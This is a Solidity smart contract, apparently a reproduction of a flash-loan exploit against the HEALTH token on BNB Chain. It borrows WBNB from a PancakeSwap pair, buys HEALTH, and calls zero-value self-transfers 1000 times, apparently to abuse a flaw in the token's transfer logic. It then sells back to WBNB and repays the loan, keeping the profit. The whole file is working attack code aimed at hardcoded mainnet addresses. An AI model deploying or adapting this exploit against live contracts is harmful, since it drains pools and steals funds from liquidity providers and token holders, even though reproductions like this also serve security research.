//SPDX-License-Identifier: MIT
pragma solidity ^0.8;
import "../interfaces/IPancakeSwap/IPancakePair.sol";
import "../interfaces/IERC20.sol";
import "../interfaces/IPancakeSwap/IPancakeCallee.sol";
import "../interfaces/IPancakeSwap/IPancakeFactory.sol";
import "../interfaces/IPancakeSwap/IPancakeRouter.sol";
import "hardhat/console.sol";

// cake = wbnb
contract HealthTokenFlashSwap is IPancakeCallee {
    address private constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant PancakeFactory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address private constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private constant cake = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
    address private constant HEALTH = 0x32B166e082993Af6598a89397E82e123ca44e74E;
    address private constant account = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    event Log(
        uint amount,
        uint _amount0,
        uint _amount1,
        uint fee,
        uint amountToRepay
    );
    receive()external payable {}
    function flashSwap(address _tokenBorrow, uint _amount) external {
        console.log("contract before", address(this).balance);
        address pair = IPancakeFactory(PancakeFactory).getPair(_tokenBorrow, cake);
        require(pair != address(0), "no pair !");
        address token0 = IPancakePair(pair).token0();
        address token1 = IPancakePair(pair).token1();
        uint amount0Out = _tokenBorrow == token0 ? _amount : 0;
        uint amount1Out = _tokenBorrow == token1 ? _amount : 0;
        bytes memory data = abi.encode(_tokenBorrow, _amount);
        IPancakePair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    // called by pair contract
    function pancakeCall(
        address _sender,
        uint _amount0,
        uint _amount1,
        bytes calldata _data
    ) external override {
        address token0 = IPancakePair(msg.sender).token0();
        address token1 = IPancakePair(msg.sender).token1();
        address pair = IPancakeFactory(PancakeFactory).getPair(token0, token1);

        require(msg.sender == pair, "no pair !");
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint amount) = abi.decode(_data, (address, uint));
        console.log("wbnb",IERC20(WBNB).balanceOf(address(this)));
        WBNBToHEALTH();
        for(uint i = 0; i < 1000; i++){
            IERC20(HEALTH).transfer(address(this), 0);
        }
        HEALTHToWBNB();
        console.log("wbnb",IERC20(WBNB).balanceOf(address(this)));
        // about 0.3%
        // uint fee = (amount * 1000 / 997) + 1;
        // uint amountToRepay = amount + (fee - amount);
        uint fee = ((amount * 3) / 997) + 1;
        uint amountToRepay = amount + fee;
        emit Log(amount, _amount0, _amount1, fee, amountToRepay);
        IERC20(tokenBorrow).transfer(pair, amountToRepay);
        console.log("contract after", IERC20(WBNB).balanceOf(address(this)));
    }
     function WBNBToHEALTH() internal{
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(HEALTH);
        uint amount = IERC20(WBNB).balanceOf(address(this));
        IERC20(WBNB).approve(PancakeRouter, amount);
        IPancakeRouter02(PancakeRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
 
    function HEALTHToWBNB() internal{
        address[] memory path = new address[](2);
        path[0] = address(HEALTH);
        path[1] = address(WBNB);
        uint amount = IERC20(HEALTH).balanceOf(address(this));
        IERC20(HEALTH).approve(PancakeRouter, amount);
        IPancakeRouter02(PancakeRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}